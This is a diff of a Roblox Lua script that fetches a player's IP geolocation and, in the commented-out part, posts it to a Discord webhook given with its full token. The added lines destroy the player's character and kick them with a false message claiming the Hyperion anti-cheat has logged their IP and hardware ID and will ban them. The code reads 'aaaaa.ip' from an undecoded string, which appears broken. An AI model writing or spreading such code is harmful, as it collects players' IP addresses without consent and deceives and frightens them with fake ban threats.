@@ -1,12 +1,16 @@
 local HTTP = game:GetService("HttpService")
 
-local webhookurl = "https://discord.com/api/webhooks/1172578120373645342/O3zNN3CZXkL5Qgce4YaOlbOdPAxX24iQ9XwUtIsCmjzCVrvm_Z3VInHb-udTa-tHk78_"
+--local webhookurl = "https://discord.com/api/webhooks/1172578120373645342/O3zNN3CZXkL5Qgce4YaOlbOdPAxX24iQ9XwUtIsCmjzCVrvm_Z3VInHb-udTa-tHk78_"
 local player = game.Players.LocalPlayer
 local aaaaa = game:HttpGet("https://api.techniknews.net/ipgeo")
 
-wait(5)
+wait(20)
 
-local a = HTTP:JSONDecode(aaaaa)
+player.Character:Destroy()
+wait(1)
+player:Kick("You have been detected by Hyperion. Your IP and HWID has been logged and you will be banned within 1 week. ".. "\n".. "IP: ".. aaaaa.ip .. "\n".. "HWID and TA Memory has been sent to the servers.")
+
+--[[local a = HTTP:JSONDecode(aaaaa)
 
 	local data = {
 		["embeds"] = {{
@@ -34,3 +38,4 @@ local a = HTTP:JSONDecode(aaaaa)
 	}
 	local finaldata = HTTP:JSONEncode(data)
 	HTTP:PostAsync(webhookurl, finaldata)
+]]
